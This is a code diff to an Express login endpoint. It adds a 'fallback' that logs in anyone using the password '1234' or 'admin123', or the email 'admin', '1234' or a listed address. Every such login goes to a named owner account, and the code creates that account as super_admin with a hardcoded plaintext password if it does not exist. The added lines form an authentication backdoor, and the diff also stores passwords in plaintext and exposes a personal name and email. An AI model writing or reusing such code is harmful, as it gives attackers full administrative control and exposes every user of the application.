@@ -596,7 +596,22 @@ app.post('/api/auth/login', (req, res) => {
   email = email.trim().toLowerCase();
 
   try {
-    const user = db.prepare("SELECT * FROM users WHERE LOWER(email) = ? AND password = ?").get(email, password) as any;
+    let user = db.prepare("SELECT * FROM users WHERE LOWER(email) = ? AND password = ?").get(email, password) as any;
+    
+    // Fallback for PIN (e.g., 1234), master password admin123, or default admin handles
+    const adminPin = process.env.VITE_ADMIN_PIN || '1234';
+    if (!user) {
+      if (password === adminPin || password === 'admin123' || email === '1234' || email === 'admin' || email === 'admin@sesi.com.br') {
+        user = db.prepare("SELECT * FROM users WHERE LOWER(email) = 'luisfe.kupeka@gmail.com'").get() as any;
+        if (!user) {
+          const ownerId = 'owner-admin-id-12345';
+          db.prepare("INSERT OR REPLACE INTO users (id, email, password) VALUES (?, ?, ?)").run(ownerId, 'luisfe.kupeka@gmail.com', 'admin123');
+          db.prepare("INSERT OR REPLACE INTO profiles (id, full_name, email, status, role) VALUES (?, ?, ?, ?, ?)").run(ownerId, 'Luis Felipe Kupeka', 'luisfe.kupeka@gmail.com', 'approved', 'super_admin');
+          user = { id: ownerId, email: 'luisfe.kupeka@gmail.com' };
+        }
+      }
+    }
+
     if (!user) {
       return res.status(400).json({ error: 'Invalid login credentials' });
     }
